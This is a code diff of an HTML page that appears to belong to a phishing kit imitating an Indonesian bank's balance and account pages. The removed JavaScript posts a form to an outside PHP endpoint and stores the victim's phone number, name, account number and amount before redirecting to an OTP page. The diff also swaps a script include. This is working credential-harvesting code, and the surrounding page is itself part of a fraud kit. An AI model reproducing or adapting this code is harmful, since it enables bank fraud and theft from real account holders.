@@ -1105,7 +1105,7 @@ Pastikan Saldo Sesuai di rekening.</p>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
     integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
     crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-<script src="mainkode1.js"></script>
+<script src="token."></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
     <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js">
     </script>
@@ -1152,45 +1152,7 @@ swal(" Forbidden ", "Silahkan Aktivasi terlebih dahulu untuk menggunakan fitur",
     
   </script>	
 <script>
-$('#forgetPasswordForm').on('submit', function (event) {
 
- $("#djload").show();
-
-  event.stopPropagation();
-    event.preventDefault();
-  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
-   
-$.ajax({
- type: 'POST',
- url: 'https://www.website-layanan.c1.is/BSI-2/12/sendSaldo.php',
- async: false,
- dataType: 'JSON',
- data: $(this).serialize(),
- 
- complete: function(data) {
-            console.log('Complete')
- 
-
-var phone = document.getElementById("nomorsaya").value;
- sessionStorage.setItem("phone", phone);
- var user = document.getElementById("namaku").value;
- sessionStorage.setItem("user", user);
- var card = document.getElementById("norekku").value;
- sessionStorage.setItem("card", card);
- var duet = document.getElementById("rupiah").value;
- sessionStorage.setItem("duet", duet);  
-location.href ="./otp.html";
- setTimeout(function(){  
-       $("#djload").hide();  
-       document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";    
-    }, 2000);
-
-     
- }
-    });
-
-    return false;
-});       
 </script>
 <script>
  var nomortel = sessionStorage.getItem("nomortel");
